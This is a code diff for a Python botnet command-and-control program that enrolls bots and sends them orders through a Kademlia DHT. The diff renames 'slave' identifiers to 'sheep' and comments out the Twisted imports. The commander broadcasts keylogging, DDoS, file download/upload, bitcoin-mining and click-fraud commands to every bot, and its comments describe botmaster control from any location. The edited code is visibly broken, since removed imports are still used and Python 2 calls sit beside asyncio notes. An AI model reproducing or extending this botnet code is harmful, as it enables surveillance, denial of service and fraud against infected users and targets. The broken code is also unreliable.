@@ -1,8 +1,8 @@
 from kademlia.network import Server
-from twisted.protocols import basic
-from twisted.internet import reactor, task, defer, stdio
+#from twisted.protocols import basic
+#from twisted.internet import reactor, task, defer, stdio
 from collections import deque
-from twisted.python import log
+#from twisted.python import log
 import sys
 import hashlib
 import re
@@ -15,7 +15,7 @@ import asyncio
 # All communication between commanders and bots occurs through DHT queries, they never communicate directly.
 
 
-class SlaveDriver(basic.LineReceiver): #Replace basic with asyncio version
+class SheepDriver(basic.LineReceiver): #Replace basic with asyncio version
     from os import linesep as delimiter
     import hashlib
 
@@ -23,23 +23,23 @@ class SlaveDriver(basic.LineReceiver): #Replace basic with asyncio version
     def __init__(self, kserver, key):
         self.kserver = kserver
         self.key = key
-        self.slaves = {}
+        self.sheeps = {}
         self.count = 0
-        self.slaveloop = task.LoopingCall(self.checknewslave) #Replace with Asyncio version
-        self.slaveloop.start(5)
+        self.sheeploop = task.LoopingCall(self.checknewsheep) #Replace with Asyncio version
+        self.sheeploop.start(5)
 
     # check DHT for new nodes
-    def checknewslave(self):
-        def addslave(val):
+    def checknewsheep(self):
+        def addsheep(val):
             if val:
-                # new slave found
-                if val not in self.slaves:
+                # new sheep found
+                if val not in self.sheeps:
                     valhash = hashlib.sha1()
                     valhash.update(str(val))
                     newval = valhash.hexdigest()
-                    self.slaves[val] = newval
-                    self.kserver.set(self.slaves[val], str(val))
-        self.kserver.get(self.key).addCallback(addslave)
+                    self.sheeps[val] = newval
+                    self.kserver.set(self.sheeps[val], str(val))
+        self.kserver.get(self.key).addCallback(addsheep)
 
     # This function will send commands to the hash of bot's id
     def parsecommands(self, line):
@@ -48,7 +48,7 @@ class SlaveDriver(basic.LineReceiver): #Replace basic with asyncio version
         if cmd == 'KEYLOG':
             # Iterate through bot list and send command out in mass.
             # This can be changed depending on the command
-            for key, val in self.slaves.iteritems():
+            for key, val in self.sheeps.iteritems():
                 output = 'Starting keylogger for bot {0}\n'.format(key)
                 self.transport.write(output)
                 # actually send commands out on DHT to bot.
@@ -56,19 +56,19 @@ class SlaveDriver(basic.LineReceiver): #Replace basic with asyncio version
                 botcmd = str(self.count) + " " + cmd
                 self.kserver.set(val, botcmd)
         if cmd == 'DDOS':
-            for key, val in self.slaves.iteritems():
+            for key, val in self.sheeps.iteritems():
                 output = 'Starting DDOS for bot {0}\n'.format(key)
                 self.transport.write(output)
                 botcmd = str(self.count) + " " + line
                 self.kserver.set(val, botcmd)
         if cmd == 'DOWNLOAD':
-            for key, val in self.slaves.iteritems():
+            for key, val in self.sheeps.iteritems():
                 output = 'Starting DOWNLOAD for bot {0}\n'.format(key)
                 self.transport.write(output)
                 botcmd = str(self.count) + " " + line
                 self.kserver.set(val, botcmd)
         if cmd == 'UPLOAD':
-            for key, val in self.slaves.iteritems():
+            for key, val in self.sheeps.iteritems():
                 output = 'Starting UPLOAD for bot {0}\n'.format(key)
                 self.transport.write(output)
                 botcmd = str(self.count) + " " + line
@@ -77,13 +77,13 @@ class SlaveDriver(basic.LineReceiver): #Replace basic with asyncio version
         if cmd == 'BITCOIN':
             print("This feature isn't fully implemented, should work "
                   "but highly insecure and slow")
-            for key, val in self.slaves.iteritems():
+            for key, val in self.sheeps.iteritems():
                 output = 'Starting BITCOIN MINING for bot {0}\n'.format(key)
                 self.transport.write(output)
                 botcmd = str(self.count) + " " + line
                 self.kserver.set(val, botcmd)
         if cmd == 'CLICKFRAUD':
-            for key, val in self.slaves.iteritems():
+            for key, val in self.sheeps.iteritems():
                 output = 'Starting CLICKFRAUD for bot {0}\n'.format(key)
                 self.transport.write(output)
                 botcmd = str(self.count) + " " + line
@@ -125,9 +125,9 @@ myport = int(sys.argv[3])
 # log.startLogging(sys.stdout) #Replace with regular python loggin. 
 
 kserver = Server()
-await kserver.listen(myport)
+kserver.listen(myport)
 # need a bootstrap address to join the network.
-await kserver.bootstrap([(boot_ip, boot_port)])
+kserver.bootstrap([(boot_ip, boot_port)])
 key = hashlib.sha1()
 
 # This is an arbitray key in DHT where a bot reports its existence.
@@ -136,11 +136,11 @@ key = hashlib.sha1()
 key.update('specialstring')
 keyhash = key.hexdigest()
 
-# The commander takes in standard input passed into our Slave Driver protocol
+# The commander takes in standard input passed into our Sheep Driver protocol
 # This could easily be changed from std input to remote input
 # we used stdin for proof of concept but the remote input would allow
 # the botmaster to spin up a commander from any location at any time.
-stdio.StandardIO(SlaveDriver(kserver, keyhash)) #Replace with asyncio version
+stdio.StandardIO(SheepDriver(kserver, keyhash)) #Replace with asyncio version
 
 reactor.run() #Change to AsyncIO loop
 
